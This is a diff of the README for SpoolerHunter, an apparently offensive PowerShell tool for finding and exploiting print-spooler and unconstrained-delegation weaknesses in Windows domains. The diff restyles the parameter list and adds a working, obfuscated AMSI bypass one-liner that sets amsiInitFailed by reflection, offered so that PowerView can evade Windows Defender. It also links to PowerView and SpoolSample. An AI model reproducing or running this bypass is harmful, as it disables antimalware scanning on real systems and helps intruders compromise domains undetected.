@@ -7,16 +7,30 @@ SpoolerHunter is a PowerShell script designed to automate the detection and expl
             border-radius: 5px; /* Rounded corners */
             padding: 10px; /* Padding around the content */
             margin-bottom: 20px; /* Margin at the bottom */
+            color:red;
             font-family: Arial, sans-serif; /* Font family */
             font-size: 14px; /* Font size */
             line-height: 1.5; /* Line height */
             overflow-x: auto; /* Enable horizontal scrolling if needed */">
-    <p>Example command:</p>
-    <pre><code>.\SpoolerHunter.ps1 [-TargetMachine <String>] [-Verbose] [-h]</code></pre>
+    <pre><code>.\SpoolerHunter.ps1 [-TargetMachine [String]] [-Verbose] [-h]</code></pre>
 </div>
-Parameters:<br/>
--TargetMachine <String>: Specifies the target machine for the scan. If not provided, the script scans for unconstrained delegation computers in the domain.
-<br/>
--Verbose: Enables verbose output, displaying detailed information about the scan and exploitation process.
-<br/>
--h: Displays the help message, providing information about the script's usage, parameters, and examples.
+<h1>Parameters:</h1><br/>
+<ul>
+	<li>
+		<b>-TargetMachine [String]</b>: Specifies the machine which is allowed to delegate. If not provided, the script scans for unconstrained delegation computers in the domain.		
+	</li>
+	<li>
+		<b>-Verbose</b>: Enables verbose output, displaying detailed information about the scan and exploitation process.
+	</li>
+	<li>
+		<b>-h</b>: Displays the help message, providing information about the script's usage, parameters, and examples.
+	</li>
+</ul>
+<h1>Note:</h1>
+<p>use the following AMSI bypass if PowerView is getting blocked by windows defender.</p>
+<pre><code>S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )</code></pre>
+<h1>Resources:</h1>
+<ul>
+	<li><a href="https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1"><b>PowerView</b></a></li>
+	<li><a href="https://github.com/leechristensen/SpoolSample"><b>MS-RPRN</b></a></li>
+</ul>
